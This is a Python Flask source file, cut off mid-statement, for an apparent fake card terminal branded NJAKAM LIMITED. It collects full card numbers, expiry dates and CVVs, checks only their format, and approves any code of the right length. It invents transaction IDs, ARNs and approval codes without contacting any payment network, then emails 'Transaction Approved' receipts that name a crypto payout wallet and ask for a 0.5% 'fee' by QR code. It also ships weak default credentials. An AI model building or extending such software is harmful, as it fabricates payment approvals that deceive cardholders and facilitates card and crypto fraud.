# app.py - cleaned NJAKAM LIMITED POS (all cards auto-authorize)
from flask import Flask, render_template, request, redirect, session, url_for, send_file, flash, jsonify
from flask_mail import Mail, Message
import random, logging, os, hashlib, json, re, tempfile, threading
from functools import wraps
from decimal import Decimal, InvalidOperation
from dotenv import load_dotenv
from datetime import datetime
from html import escape as html_escape
import io
import imaplib
import time
from reportlab.lib.pagesizes import letter
from reportlab.lib.colors import HexColor, black
from reportlab.pdfgen import canvas

# Load environment variables from .env file
load_dotenv(dotenv_path='.env')

logging.basicConfig(level=logging.INFO)

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'njakamltd_secret_key_8583')

# Email Configuration
app.config['MAIL_SERVER'] = os.environ.get('MAIL_SERVER', 'smtp.gmail.com')
app.config['MAIL_PORT'] = int(os.environ.get('MAIL_PORT', 587))
mail_use_tls_env = os.environ.get('MAIL_USE_TLS')
mail_use_ssl_env = os.environ.get('MAIL_USE_SSL')

# Smart defaults:
# - Port 465 typically means implicit SSL
# - Port 587 typically means STARTTLS
# This prevents "connection unexpectedly closed" when one of the flags is missing.
app.config['MAIL_USE_SSL'] = (mail_use_ssl_env.lower() == 'true') if mail_use_ssl_env is not None else (app.config['MAIL_PORT'] == 465)
app.config['MAIL_USE_TLS'] = (mail_use_tls_env.lower() == 'true') if mail_use_tls_env is not None else (app.config['MAIL_PORT'] == 587 and not app.config['MAIL_USE_SSL'])
app.config['MAIL_USERNAME'] = os.environ.get('MAIL_USERNAME', '')
app.config['MAIL_PASSWORD'] = os.environ.get('MAIL_PASSWORD', '')
app.config['MAIL_DEFAULT_SENDER'] = os.environ.get('MAIL_DEFAULT_SENDER', 'support@njakamltd.com')
mail = Mail(app)

# Footer on receipt emails (plain text + HTML)
TERMINAL_MAIL_ADDRESS_LINE = "Paarl City, 7624 - South Africa"
TERMINAL_MAIL_CONTACT = "+14145126049"
TERMINAL_MAIL_SUPPORT_EMAIL = "support@njakamltd.com"


def _mail_imap_host_default():
    """Spacemail and many hosts use the same hostname for SMTP and IMAP; Gmail uses imap.gmail.com."""
    h = (os.environ.get("MAIL_IMAP_HOST") or "").strip()
    if h:
        return h
    smtp = (app.config.get("MAIL_SERVER") or "").strip().lower()
    if "gmail" in smtp:
        return "imap.gmail.com"
    if smtp:
        return (app.config.get("MAIL_SERVER") or "").strip()
    return "imap.gmail.com"


def _mail_imap_sent_folder_default():
    """Gmail uses a special folder path; most Dovecot/cPanel-style hosts (e.g. Spacemail) use Sent."""
    f = (os.environ.get("MAIL_IMAP_SENT_FOLDER") or "").strip()
    if f:
        return f
    smtp = (app.config.get("MAIL_SERVER") or "").strip().lower()
    if "gmail" in smtp:
        return "[Gmail]/Sent Mail"
    return "Sent"


def _mail_save_copy_to_sent_folder(msg):
    """
    SMTP (Flask-Mail) delivers mail but does not file a copy in the sender's Sent folder.
    When MAIL_SAVE_TO_SENT is enabled, append the same MIME to the account's Sent mailbox via IMAP
    (same approach Spacemail documents: IMAP append, not SMTP).
    """
    flag = (os.environ.get("MAIL_SAVE_TO_SENT") or "").strip().lower()
    if flag not in ("1", "true", "yes", "on"):
        return
    imap_user = (os.environ.get("MAIL_IMAP_USER") or app.config.get("MAIL_USERNAME") or "").strip()
    imap_password = (os.environ.get("MAIL_IMAP_PASSWORD") or app.config.get("MAIL_PASSWORD") or "").strip()
    if not imap_user or not imap_password:
        logging.warning(
            "MAIL_SAVE_TO_SENT is set but IMAP credentials are missing "
            "(set MAIL_IMAP_USER / MAIL_IMAP_PASSWORD or MAIL_USERNAME / MAIL_PASSWORD); skipping Sent copy"
        )
        return
    host = _mail_imap_host_default()
    folder = _mail_imap_sent_folder_default()
    try:
        port = int((os.environ.get("MAIL_IMAP_PORT") or "993").strip())
    except ValueError:
        port = 993
    try:
        raw = msg.as_bytes()
    except Exception:
        logging.exception("Could not serialize outbound message for Sent folder copy")
        return
    try:
        with imaplib.IMAP4_SSL(host, port) as M:
            M.login(imap_user, imap_password)
            M.append(folder, "\\Seen", imaplib.Time2Internaldate(time.time()), raw)
        logging.info("Saved copy of sent message to IMAP folder %r on %s:%s", folder, host, port)
    except Exception as e:
        logging.warning("Could not append copy to Sent folder %r on %s:%s: %s", folder, host, port, e)


def _receipt_email_plain_and_html(txn_id, amount_fmt, timestamp):
    """Plain and HTML bodies for receipt emails; address block includes contact phone."""
    plain = f"""Dear Customer,

Thank you for your transaction at NJAKAM LIMITED.

Please find your receipt attached as a PDF.

Transaction Summary:
- Transaction ID: {txn_id}
- Amount: USD {amount_fmt}
- Date: {timestamp}
- Status: Approved

---
NJAKAM LIMITED Terminal
{TERMINAL_MAIL_ADDRESS_LINE}
Terminal support: {TERMINAL_MAIL_CONTACT}

This is an automated receipt. Please keep for your records.
"""
    tel_href = "".join(c for c in TERMINAL_MAIL_CONTACT if c.isdigit() or c == "+")
    if not tel_href.startswith("+"):
        tel_href = "+" + tel_href.lstrip("+")
    html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"></head><body style="margin:16px;font-family:system-ui,-apple-system,sans-serif;font-size:15px;color:#0f172a;line-height:1.5;">
<p>Dear Customer,</p>
<p>Thank you for your transaction at NJAKAM LIMITED.</p>
<p>Please find your receipt attached as a PDF.</p>
<p><strong>Transaction Summary:</strong></p>
<ul style="margin:0.5em 0;padding-left:1.25em;">
<li>Transaction ID: {html_escape(str(txn_id))}</li>
<li>Amount: USD {html_escape(str(amount_fmt))}</li>
<li>Date: {html_escape(str(timestamp))}</li>
<li>Status: Approved</li>
</ul>
<hr style="border:none;border-top:1px solid #cbd5e1;margin:1.25rem 0;">
<p style="margin:0;"><strong>NJAKAM LIMITED Terminal</strong><br>
{html_escape(TERMINAL_MAIL_ADDRESS_LINE)}<br>
Terminal support: <a href="tel:{html_escape(tel_href)}">{html_escape(TERMINAL_MAIL_CONTACT)}</a></p>
<p style="margin-top:1rem;font-size:13px;color:#64748b;">This is an automated receipt. Please keep for your records.</p>
</body></html>"""
    return plain, html

# Fixed numeric Server ID for receipts (env SERVER_ID = digits only, e.g. "123456"; default "000000")
DEFAULT_SERVER_ID = "000000"

def _get_receipt_server_id():
    """Return fixed numeric server ID for receipts. From env SERVER_ID (digits only), else default."""
    raw = (os.environ.get('SERVER_ID') or DEFAULT_SERVER_ID).strip()
    digits = re.sub(r'\D', '', raw)
    return digits if digits else DEFAULT_SERVER_ID

def _mask_receipt_server_id(server_id):
    """Return server ID fully masked for display (fixed, numeric underlying value; show only asterisks)."""
    sid = (server_id or DEFAULT_SERVER_ID).strip()
    length = max(6, min(len(sid), 12))  # mask length 6–12
    return "*" * length


def _mask_email_for_receipt(email):
    """Mask local part on printed/screen receipts; domain stays visible."""
    e = (email or "").strip()
    if not e or "@" not in e:
        return "—"
    local, _, domain = e.partition("@")
    domain = domain.strip()
    if not domain:
        return "—"
    if not local:
        return f"••••@{domain}"
    return f"{local[0]}••••@{domain}"


def _wallet_image_filename(payout_type):
    """Return the wallet image filename that exists on disk (tries both cases for Linux)."""
    payout_upper = (payout_type or "").strip().upper()
    if payout_upper == "ERC20":
        candidates = ["ERC20.jpeg", "erc20.jpeg"]
    else:
        candidates = ["TRC20.jpeg", "trc20.jpeg"]
    static_dir = os.path.join(app.root_path, 'static')
    for name in candidates:
        if os.path.exists(os.path.join(static_dir, name)):
            return name
    return candidates[0]  # fallback so URL is still generated

def _build_receipt_pdf_bytes(txn_id, arn, pan_last4, amount, payout_type, wallet, auth_code, timestamp, server_id=None):
    """Generate PDF receipt with logo and QR code"""
    pdf_buffer = io.BytesIO()
    
    try:
        c = canvas.Canvas(pdf_buffer, pagesize=letter)
        width, height = letter
        
        margin_x = 40
        inner_w = width - 2 * margin_x
        logo_path = os.path.join(app.root_path, 'static', 'logo.png')
        has_logo = os.path.exists(logo_path)
        img_w, img_h = (108, 54) if has_logo else (0, 0)
        logo_gap = 16 if has_logo else 0

        title = "NJAKAM LIMITED"
        title_font, title_size = "Helvetica-Bold", 28
        addr_lines = [
            TERMINAL_MAIL_ADDRESS_LINE,
            TERMINAL_MAIL_SUPPORT_EMAIL,
        ]
        addr_font, addr_size = "Helvetica", 10
        line_gap = 12
        pad = 10
        gap_title_addr = 8
        content_h = (
            pad
            + title_size
            + gap_title_addr
            + (len(addr_lines) - 1) * line_gap
            + addr_size
            + pad
        )
        block_h = max(content_h, img_h + 8) if has_logo else content_h
        block_top = height - 36
        block_bottom = block_top - block_h
        block_x = margin_x + img_w + logo_gap
        block_w = width - margin_x - block_x

        # Right block: large title + address (single framed column)
        c.setFillColor(HexColor("#f8fafc"))
        c.setStrokeColor(HexColor("#cbd5e1"))
        c.setLineWidth(0.75)
        c.roundRect(block_x, block_bottom, block_w, block_h, 6, stroke=1, fill=1)

        text_left = block_x + pad
        y_cursor = block_top - pad - 2
        c.setFillColor(black)
        c.setFont(title_font, title_size)
        c.drawString(text_left, y_cursor, title)
        y_cursor -= title_size + gap_title_addr
        c.setFont(addr_font, addr_size)
        c.setFillColor(HexColor("#475569"))
        for line in addr_lines:
            c.drawString(text_left, y_cursor, line)
            y_cursor -= line_gap
        c.setFillColor(black)

        # Left block: logo only, vertically centered with the title column
        if has_logo:
            logo_y = block_bottom + (block_h - img_h) / 2
            c.drawImage(logo_path, margin_x, logo_y, width=img_w, height=img_h)

        y = block_bottom - 16

        # Accent bar + copy label (full width below header row)
        bar_h = 3
        c.setFillColor(HexColor("#0f766e"))
        c.rect(margin_x, y - bar_h, inner_w, bar_h, fill=1, stroke=0)
        y -= bar_h + 12
        c.setFont("Helvetica-Bold", 11)
        c.setFillColor(HexColor("#64748b"))
        sub = "CUSTOMER COPY"
        sw = c.stringWidth(sub, "Helvetica-Bold", 11)
        c.drawString((width - sw) / 2, y, sub)
        c.setFillColor(black)
        y -= 26

        # Merchant fee wallet image: TRC20.jpeg or ERC20.jpeg (the QR/address to pay 0.5% fee)
        qr_x = width - 130
        qr_y_start = y  # Same level as transaction ID
        
        qr_image = _wallet_image_filename(payout_type)
        qr_image_path = os.path.join(app.root_path, 'static', qr_image)
        if os.path.exists(qr_image_path):
            c.drawImage(qr_image_path, qr_x, qr_y_start - 100, width=110, height=110)
        else:
            logging.warning("Merchant fee image not found at %s (ensure static/%s is in repo and deployed)", qr_image_path, qr_image)

        # Fee label below the merchant fee wallet image
        try:
            amount_numeric = float(str(amount).replace(',', ''))
            merchant_fee = amount_numeric * 0.005  # 0.5% fee
            fee_label = f"Scan to pay fee (${merchant_fee:.2f})"
        except (ValueError, TypeError):
            fee_label = "Scan to pay merchant fee (0.5%)"
        c.setFont("Helvetica", 7)
        c.drawString(qr_x, qr_y_start - 115, fee_label)

        # Transaction details (left side)
        c.setFont("Helvetica", 9)
        
        # Mask card number (show only last 4)
        masked_card = f"**** **** **** {pan_last4}"
        
        # Mask auth code
        masked_auth = "*" * len(auth_code) if auth_code else "****"
        
        # Truncate wallet for display
        wallet_display = wallet[:8] + "..." + wallet[-8:] if wallet and len(wallet) > 20 else wallet
        
        # Determine how to show the server/connection on the PDF receipt
        if server_id is None:
            sid_source = _get_receipt_server_id()
            sid = _mask_receipt_server_id(sid_source)
        else:
            sid_str = str(server_id).strip()
            # Special value "OFFLINE" means show as offline instead of masked digits
            if sid_str.upper() == "OFFLINE":
                sid = "OFFLINE"
            else:
                sid = _mask_receipt_server_id(sid_str)
        details = [
            ("Transaction ID:", txn_id),
            ("ARN:", arn),
            ("Card:", masked_card),
            ("Amount:", f"USD {amount}"),
            ("Auth Code:", masked_auth),
            ("Status:", "Transaction Approved"),
            ("Payout Type:", payout_type),
            ("Receiving Address:", wallet_display if wallet else "N/A"),
            ("Date/Time:", timestamp),
            ("Connected Server ID:", sid),
        ]
        
        for label, value in details:
            c.drawString(40, y, label)
            c.drawString(180, y, str(value))
            y -= 15
        
        # Move down after details
        y -= 20
        
        # Footer
        c.setFont("Helvetica", 8)
        c.drawString(40, y, "FINAL SALE")
        y -= 12
        c.drawString(40, y, "Thank you for your transaction.")
        y -= 12
        c.drawString(40, y, "Please keep this receipt for your records.")
        
        c.save()
        pdf_buffer.seek(0)
        return pdf_buffer.getvalue()
    except Exception as e:
        logging.exception("Failed to generate receipt PDF")
        raise

USERNAME = "njakamaltd"
PASSWORD_FILE = "password.json"
TRANSACTIONS_FILE = "transactions.json"
MAX_STORED_TRANSACTIONS = 2000
_transactions_lock = threading.Lock()

if not os.path.exists(PASSWORD_FILE):
    with open(PASSWORD_FILE, "w") as f:
        hashed = hashlib.sha256("admin123".encode()).hexdigest()
        json.dump({"password": hashed}, f)

TERMINAL_GATE_FILE = "terminal_gate.json"

if not os.path.exists(TERMINAL_GATE_FILE):
    with open(TERMINAL_GATE_FILE, "w") as f:
        default_gate = os.environ.get("TERMINAL_GATE_CODE", "882288")
        gh = hashlib.sha256(default_gate.encode()).hexdigest()
        json.dump({"gate_password": gh}, f)


def check_password(raw):
    with open(PASSWORD_FILE) as f:
        stored = json.load(f)['password']
    return hashlib.sha256(raw.encode()).hexdigest() == stored

def set_password(newpass):
    with open(PASSWORD_FILE, "w") as f:
        hashed = hashlib.sha256(newpass.encode()).hexdigest()
        json.dump({"password": hashed}, f)


def check_terminal_gate(raw):
    """Separate from staff login; unlocks Settings & Reports only."""
    try:
        with open(TERMINAL_GATE_FILE, encoding="utf-8") as f:
            stored = json.load(f)["gate_password"]
        return hashlib.sha256((raw or "").encode()).hexdigest() == stored
    except (OSError, KeyError, TypeError, json.JSONDecodeError):
        return False


def _sanitize_terminal_gate_next(candidate):
    """Allow only in-app paths for Settings and Reports (no open redirects)."""
    if not candidate or not isinstance(candidate, str):
        return url_for("dashboard")
    path = candidate.split("?")[0].strip()
    if not path.startswith("/"):
        return url_for("dashboard")
    path = path.rstrip("/") or "/"
    allowed = frozenset(
        (
            url_for("settings").rstrip("/"),
            url_for("reports").rstrip("/"),
        )
    )
    if path in allowed:
        return path
    return url_for("dashboard")


def _terminal_unlock_session_key_for_path(path):
    """Which session flag to set after a successful unlock for this path."""
    p = (path or "").rstrip("/")
    if p == url_for("settings").rstrip("/"):
        return "terminal_unlock_settings"
    if p == url_for("reports").rstrip("/"):
        return "terminal_unlock_reports"
    return None


def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated


def require_terminal_unlock(area):
    """Staff login + terminal code for this area only (Settings and Reports each ask once per session)."""
    session_key = f"terminal_unlock_{area}"
    if area not in ("settings", "reports"):
        raise ValueError("area must be 'settings' or 'reports'")

    def decorator(f):
        @wraps(f)
        def decorated_view(*args, **kwargs):
            if not session.get("logged_in"):
                return redirect(url_for("login"))
            if not session.get(session_key):
                dest = url_for(area)
                return redirect(url_for("terminal_gate", next=dest))
            return f(*args, **kwargs)
        return decorated_view
    return decorator


# Protocols (determine expected auth code length) — split for UI: online vs offline
ONLINE_PROTOCOLS = {
    "POS Terminal -101.1 (4-digit approval)": 4,
    "POS Terminal -101.4 (4-digit approval)": 4,
    "POS Terminal -101.6 (Pre-authorization)": 6,
    "POS Terminal -101.7 (4-digit approval)": 4,
    "POS Terminal -101.8 (PIN-LESS transaction)": 4,
    "POS Terminal -201.1 (6-digit approval)": 6,
    "POS Terminal -201.5 (6-digit approval)": 6,
}
OFFLINE_PROTOCOLS = {
    "POS Terminal -101.1 (4-digit approval, offline)": 4,
    "POS Terminal -201.3 (6-digit approval, offline )": 6,
}
PROTOCOLS = {**ONLINE_PROTOCOLS, **OFFLINE_PROTOCOLS}

def _clear_sale_session():
    """Reset in-progress sale data (keep login)."""
    for key in (
        'protocol_mode', 'protocol', 'code_length', 'pinless', 'offline',
        'amount', 'payout_type', 'wallet', 'pan', 'exp', 'cvv', 'card_type', 'email',
        'txn_id', 'arn', 'timestamp', 'field39', 'auth_code',
        '_txn_history_logged',
    ):
        session.pop(key, None)


def _load_transactions():
    """Return stored transactions, newest first."""
    with _transactions_lock:
        if not os.path.exists(TRANSACTIONS_FILE):
            return []
        try:
            with open(TRANSACTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            return data if isinstance(data, list) else []
        except (json.JSONDecodeError, OSError) as e:
            logging.warning("Could not read %s: %s", TRANSACTIONS_FILE, e)
            return []


def _append_transaction_record(record):
    """Persist one approved sale. Omits full PAN, CVV, and plaintext auth code."""
    with _transactions_lock:
        rows = []
        if os.path.exists(TRANSACTIONS_FILE):
            try:
                with open(TRANSACTIONS_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                if isinstance(data, list):
                    rows = data
            except (json.JSONDecodeError, OSError) as e:
                logging.warning("Corrupt %s, starting fresh: %s", TRANSACTIONS_FILE, e)
                rows = []
        # Avoid duplicate row if same txn_id is logged again
        tid = record.get("txn_id")
        if tid:
            rows = [r for r in rows if r.get("txn_id") != tid]
        rows.insert(0, record)
        rows = rows[:MAX_STORED_TRANSACTIONS]
        tmp_path = TRANSACTIONS_FILE + ".tmp"
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(rows, f, indent=2)
        os.replace(tmp_path, TRANSACTIONS_FILE)


def _require_protocol_selected():
    """Require a protocol that matches the chosen online/offline mode (host connection)."""
    proto = session.get('protocol')
    if not proto:
        return redirect(url_for('protocol'))
    mode = session.get('protocol_mode')
    if not mode or mode not in ('online', 'offline'):
        flash("Connection mode missing. Please choose host connection again.")
        session.pop('protocol', None)
        return redirect(url_for('protocol'))
    allowed = ONLINE_PROTOCOLS if mode == 'online' else OFFLINE_PROTOCOLS
    if proto not in allowed:
        flash("Selected protocol does not match online/offline mode. Please pick protocols again.")
        session.pop('protocol', None)
        return redirect(url_for('protocol_select'))
    if proto not in PROTOCOLS:
        flash("Invalid protocol.")
        session.pop('protocol', None)
        return redirect(url_for('protocol_select'))
    return None

@app.route('/')
def home():
    if session.get('logged_in'):
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if session.get('logged_in'):
        return redirect(url_for('dashboard'))
    if request.method == 'POST':
        user = request.form.get('username')
        passwd = request.form.get('password')
        if user == USERNAME and check_password(passwd):
            session.clear()
            session['logged_in'] = True
            session['username'] = user
            return redirect(url_for('dashboard'))
        flash("Invalid username or password.")
    return render_template('login.html')

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

@app.route('/history')
@login_required
def history():
    transactions = _load_transactions()
    return render_template('history.html', transactions=transactions)

@app.route('/terminal-gate', methods=['GET', 'POST'])
@login_required
def terminal_gate():
    """Unlock Settings & Reports with a code different from staff login password."""
    next_path = _sanitize_terminal_gate_next(
        request.args.get("next") or request.form.get("next")
    )
    if request.method == "POST":
        if check_terminal_gate(request.form.get("gate_code", "")):
            sk = _terminal_unlock_session_key_for_path(next_path)
            if sk:
                session[sk] = True
            return redirect(next_path)
        flash("Invalid terminal access code.")
    return render_template("terminal_gate.html", next_path=next_path)


@app.route('/settings')
@require_terminal_unlock("settings")
def settings():
    return render_template('settings.html')

@app.route('/reports')
@require_terminal_unlock("reports")
def reports():
    return render_template('reports.html')

@app.route('/protocol', methods=['GET', 'POST'])
@login_required
def protocol():
    """Step 1: choose online vs offline host link; then /protocol/select for variant."""
    if request.method == 'POST':
        mode = request.form.get('protocol_mode')
        if mode not in ('online', 'offline'):
            flash("Please choose online or offline.")
            return redirect(url_for('protocol'))
        session['protocol_mode'] = mode
        return redirect(url_for('protocol_select'))
    _clear_sale_session()
    return render_template('protocol_mode.html')

@app.route('/protocol/select', methods=['GET', 'POST'])
@login_required
def protocol_select():
    """Step 2: pick exact protocol for the chosen mode."""
    mode = session.get('protocol_mode')
    if not mode:
        return redirect(url_for('protocol'))
    protocols_dict = ONLINE_PROTOCOLS if mode == 'online' else OFFLINE_PROTOCOLS

    if request.method == 'POST':
        selected = request.form.get('protocol')
        if selected not in protocols_dict:
            flash("Invalid protocol selected.")
            return redirect(url_for('protocol_select'))
        if selected not in PROTOCOLS:
            flash("Unknown protocol.")
            return redirect(url_for('protocol_select'))
        session['protocol'] = selected
        session['code_length'] = PROTOCOLS[selected]
        session['pinless'] = ("101.8" in selected)
        session['offline'] = selected in OFFLINE_PROTOCOLS
        return redirect(url_for('amount'))

    return render_template(
        'protocol_select.html',
        protocol_mode=mode,
        protocols_dict=protocols_dict,
    )

@app.route('/amount', methods=['GET', 'POST'])
@login_required
def amount():
    redir = _require_protocol_selected()
    if redir:
        return redir
    if request.method == 'POST':
        session['amount'] = request.form.get('amount')
        return redirect(url_for('payout'))
    return render_template('amount.html')

@app.route('/payout', methods=['GET', 'POST'])
@login_required
def payout():
    redir = _require_protocol_selected()
    if redir:
        return redir
    if request.method == 'POST':
        method = request.form['method']
        session['payout_type'] = method

        if method == 'ERC20':
            wallet = request.form.get('erc20_wallet', '').strip()
            if not wallet.startswith("0x") or len(wallet) != 42:
                flash("Invalid ERC20 address format.")
                return redirect(url_for('payout'))
            session['wallet'] = wallet

        elif method == 'TRC20':
            wallet = request.form.get('trc20_wallet', '').strip()
            if not wallet.startswith("T") or len(wallet) < 34:
                flash("Invalid TRC20 address format.")
                return redirect(url_for('payout'))
            session['wallet'] = wallet

        return redirect(url_for('card'))

    return render_template('payout.html')


# Server-side validator for card entry
from datetime import datetime

# Top-of-file config (put near other global constants)
BLACKLIST_PREFIXES = ['1','2','7','8','9','6']  # adjust if you want to allow '6' etc.

def luhn_check(card_number: str) -> bool:
    """Return True if card_number passes Luhn algorithm."""
    try:
        digits = [int(d) for d in card_number]
    except ValueError:
        return False
    checksum = 0
    dbl = False
    for d in reversed(digits):
        if dbl:
            val = d * 2
            if val > 9:
                val -= 9
            checksum += val
        else:
            checksum += d
        dbl = not dbl
    return checksum % 10 == 0

@app.route('/card', methods=['GET', 'POST'])
@login_required
def card():
    redir = _require_protocol_selected()
    if redir:
        return redir
    offline = session.get('offline', False)
    if request.method == 'POST':
        # sanitize inputs (client formatting may include spaces/slashes)
        pan_raw = request.form.get('pan', '')
        pan_digits = re.sub(r'\D', '', pan_raw)  # remove spaces and non-digits
        expiry_raw = request.form.get('expiry', '')
        expiry_clean = re.sub(r'\D', '', expiry_raw)  # MMYY expected after cleaning
        cvv_raw = request.form.get('cvv', '')
        cvv_digits = re.sub(r'\D', '', cvv_raw)

        # Basic presence checks
        if not pan_digits:
            flash("Card number is required.")
            return render_template('card.html', offline_no_cvv=offline)
        if not expiry_clean:
            flash("Expiry date is required.")
            return render_template('card.html', offline_no_cvv=offline)
        if not cvv_digits and not offline:
            flash("CVV is required.")
            return render_template('card.html', offline_no_cvv=offline)

        # PAN length check (must be exactly 16 digits for your flow)
        if len(pan_digits) != 16:
            flash("Card must be 16 digits.")
            return render_template('card.html', offline_no_cvv=offline)

        # BIN prefix blacklist (first digit)
        first_digit = pan_digits[0]
        if first_digit in BLACKLIST_PREFIXES:
            flash("Invalid / unsupported card BIN.")
            return render_template('card.html', offline_no_cvv=offline)

        # Luhn check
        if not luhn_check(pan_digits):
            flash("Card number failed validation (invalid number).")
            return render_template('card.html', offline_no_cvv=offline)

        # Expiry: expect MMYY (2 + 2)
        if len(expiry_clean) != 4:
            flash("Expiry must be in MM/YY format.")
            return render_template('card.html', offline_no_cvv=offline)
        try:
            month = int(expiry_clean[:2])
            year_two = int(expiry_clean[2:])
        except ValueError:
            flash("Expiry must contain a valid month and year.")
            return render_template('card.html', offline_no_cvv=offline)
        if month < 1 or month > 12:
            flash("Expiry month must be between 01 and 12.")
            return render_template('card.html', offline_no_cvv=offline)

        # Convert two-digit year to full year (assume 2000-2099)
        year_full = 2000 + year_two
        now = datetime.now()
        # If expiry is at end of expiry month, it's still valid for that month
        expiry_dt = datetime(year=year_full, month=month, day=1)
        # Compare (year,month) to current (year,month)
        if (year_full < now.year) or (year_full == now.year and month < now.month):
            flash("Card has expired.")
            return render_template('card.html', offline_no_cvv=offline)

        # Card type inference for CVV length
        if pan_digits.startswith("4"):
            card_type = "VISA"
            expected_cvv_len = 3
        elif pan_digits.startswith("5"):
            card_type = "MASTERCARD"
            expected_cvv_len = 3
        elif pan_digits.startswith("3"):
            card_type = "AMEX"
            expected_cvv_len = 4
        elif pan_digits.startswith("6"):
            card_type = "DISCOVER"
            expected_cvv_len = 3
        else:
            card_type = "UNKNOWN"
            expected_cvv_len = 3

        if offline:
            # In offline mode, CVV is optional; if provided, it must still match expected length
            if cvv_digits and len(cvv_digits) != expected_cvv_len:
                flash(f"CVV must be {expected_cvv_len} digits for {card_type} when provided.")
                return render_template('card.html', offline_no_cvv=offline)
        else:
            if len(cvv_digits) != expected_cvv_len:
                flash(f"CVV must be {expected_cvv_len} digits for {card_type}.")
                return render_template('card.html', offline_no_cvv=offline)

        # Validate email
        email = request.form.get('email', '').strip()
        if not email or '@' not in email:
            flash("Please enter a valid email address.")
            return render_template('card.html', offline_no_cvv=offline)

        # All server-side validations passed -> store values and continue
        # NOTE: Avoid logging sensitive values (do not log CVV).
        session.update({
            'pan': pan_digits,
            'exp': expiry_clean,
            'cvv': cvv_digits,          # stored in session for auth flow; remove if you prefer not to store
            'card_type': card_type,
            'email': email
        })

        # If pinless, jump straight to decrypting screen
        if session.get("pinless"):
            return redirect(url_for('decrypting'))

        return redirect(url_for('auth'))

    # GET handler
    return render_template('card.html', offline_no_cvv=offline)


@app.route('/decrypting')
@login_required
def decrypting():
    redir = _require_protocol_selected()
    if redir:
        return redir
    # Pinless (101.8): set transaction details here so flow can proceed to processing -> success like other protocols
    if not session.get('txn_id'):
        code_length = session.get('code_length', 4)
        session.update({
            "txn_id": f"TXN{random.randint(100000, 999999)}",
            "arn": f"ARN{random.randint(100000000000, 999999999999)}",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "field39": "00",
            "auth_code": "".join(str(random.randint(0, 9)) for _ in range(code_length)),
        })
    return render_template('decrypting.html')

@app.route('/auth', methods=['GET', 'POST'])
@login_required
def auth():
    redir = _require_protocol_selected()
    if redir:
        return redir
    expected_length = session.get('code_length', 6)

    if request.method == 'POST':
        code = request.form.get('auth', '').strip()

        # Validate length only. Approve any card/code that matches expected length.
        if len(code) != expected_length:
            return render_template('auth.html',
                                   warning=f"Code must be {expected_length} digits.",
                                   expected_length=expected_length)

        # Store auth code and transaction details, then redirect to processing
        txn_id = f"TXN{random.randint(100000, 999999)}"
        arn = f"ARN{random.randint(100000000000, 999999999999)}"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        field39 = "00"

        session.update({
            "txn_id": txn_id,
            "arn": arn,
            "timestamp": timestamp,
            "field39": field39,
            "auth_code": code  # store entered code for receipt masking
        })
        return redirect(url_for('processing'))

    return render_template('auth.html', expected_length=expected_length)

@app.route('/processing')
@login_required
def processing():
    redir = _require_protocol_selected()
    if redir:
        return redir
    offline = session.get('offline', False)
    return render_template('processing.html', offline=offline)

@app.route('/success')
@login_required
def success():
    redir = _require_protocol_selected()
    if redir:
        return redir

    raw_amount = session.get("amount", "0")
    try:
        amt = Decimal(str(raw_amount))
        amount_fmt = f"{amt:,.2f}"
    except (InvalidOperation, TypeError):
        amount_fmt = "0.00"

    txn_id = session.get("txn_id")
    if txn_id and not session.get("_txn_history_logged"):
        raw_protocol = session.get("protocol", "")
        pv_match = re.search(r"-(\d+\.\d+)", raw_protocol)
        protocol_code = pv_match.group(1) if pv_match else "—"
        ac = session.get("auth_code") or ""
        auth_display = ("*" * len(ac)) if ac else "—"
        record = {
            "txn_id": txn_id,
            "timestamp": session.get("timestamp") or datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "amount": str(session.get("amount")),
            "amount_fmt": amount_fmt,
            "payout_type": (session.get("payout_type") or "").strip(),
            "pan_last4": session.get("pan", "")[-4:] if session.get("pan") else "",
            "protocol": raw_protocol,
            "protocol_code": protocol_code,
            "offline": bool(session.get("offline")),
            "arn": session.get("arn") or "",
            "card_type": session.get("card_type") or "",
            "email_masked": _mask_email_for_receipt(session.get("email")),
            "operator": session.get("username") or "",
            "auth_masked": auth_display,
        }
        try:
            _append_transaction_record(record)
            session["_txn_history_logged"] = True
        except OSError:
            logging.exception("Failed to persist transaction history")

    # Automatically send receipt email
    recipient_email = session.get('email')
    if recipient_email and app.config['MAIL_USERNAME'] and app.config['MAIL_PASSWORD']:
        logging.info("Preparing automatic receipt email for %s", recipient_email)
        try:
            # Prepare receipt data
            raw_protocol = session.get("protocol", "")
            match = re.search(r"-(\d+\.\d+)\s+\((\d+)-digit", raw_protocol)
            if match:
                protocol_version = match.group(1)
                auth_digits = int(match.group(2))
            else:
                protocol_version = "Unknown"
                auth_digits = 4
            
            # Get actual auth code (not masked)
            auth_code = session.get("auth_code", "")
            if not auth_code:
                auth_code = "*" * auth_digits
            
            # Determine wallet image
            payout_type = (session.get("payout_type") or "").strip().upper()
            wallet_image = _wallet_image_filename(session.get("payout_type"))

            # Set server/connection indicator for PDF receipt (OFFLINE vs masked server ID)
            offline = session.get("offline", False)
            if offline:
                server_for_pdf = "OFFLINE"
            else:
                server_for_pdf = _get_receipt_server_id()
            pdf_bytes = _build_receipt_pdf_bytes(
                txn_id=session.get('txn_id'),
                arn=session.get('arn'),
                pan_last4=session.get("pan")[-4:] if session.get("pan") else "",
                amount=amount_fmt,
                payout_type=session.get("payout_type"),
                wallet=session.get("wallet"),
                auth_code=auth_code,
                timestamp=session.get("timestamp"),
                server_id=server_for_pdf
            )
            
            # Create email message
            subject = f"NJAKAM LIMITED Receipt - Transaction {session.get('txn_id')}"
            body, html_body = _receipt_email_plain_and_html(
                session.get('txn_id'), amount_fmt, session.get('timestamp')
            )
            msg = Message(
                subject=subject,
                recipients=[recipient_email],
                body=body,
                html=html_body,
                sender=app.config['MAIL_DEFAULT_SENDER']
            )
            
            # Attach PDF receipt
            msg.attach(
